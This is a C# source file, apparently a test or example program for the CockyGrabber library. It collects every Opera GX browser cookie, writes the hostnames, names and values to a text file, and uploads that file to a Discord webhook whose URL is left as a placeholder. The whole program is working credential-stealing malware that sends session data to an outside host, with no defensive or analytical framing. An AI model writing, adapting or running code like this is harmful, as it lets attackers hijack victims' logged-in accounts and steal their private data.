using CockyGrabber;
using CockyGrabber.Grabbers;
using System.IO;
using System.Linq;
using System.Text;
using System.Net.Http;

namespace CockyGrabberTest
{
    // This Program collects all OperaGx Cookies and sends them as a file to a discord webhook
    class Program
    {
        private const string WebhookUrl = "YOUR WEBHOOK URL HERE";

        /// <summary>
        /// Send a file through a Discord Webhook
        /// </summary>
        /// <param name="webhookUrl">The Webhook URL</param>
        /// <param name="path">The path to the file you want to send</param>
        public static void SendFile(string webhookUrl, string path)
        {
            string fileContents = File.ReadAllText(path); // Read file

            // Convert the contents of the file to HTTP content for the POST request:
            MultipartFormDataContent httpContent = new MultipartFormDataContent
            {
                {
                    new ByteArrayContent(Encoding.Default.GetBytes(fileContents)), "file", path.Split('/', '\\').Last()
                }
            };

            new HttpClient().PostAsync(webhookUrl, httpContent).GetAwaiter().GetResult(); // Post the HTTP contents to the URL
        }

        static void Main(string[] args)
        {
            OperaGxGrabber g = new OperaGxGrabber(); // Create Grabber
            StringBuilder cookies = new StringBuilder();

            g.GetCookies().ToList().ForEach(delegate (Blink.Cookie c) // For every grabbed cookie:
            {
                cookies.AppendLine($"Hostname: {c.HostKey} | Name: {c.Name} | Value: {c.EncryptedValue}"); // Add the cookie hostname, name, and value to the 'cookie' list
            });

            File.WriteAllText("./cookies_save.txt", cookies.ToString()); // Save cookies in cookies_save.txt
            SendFile(WebhookUrl, "./cookies_save.txt"); // Send the File to the Webhook
        }
    }
}
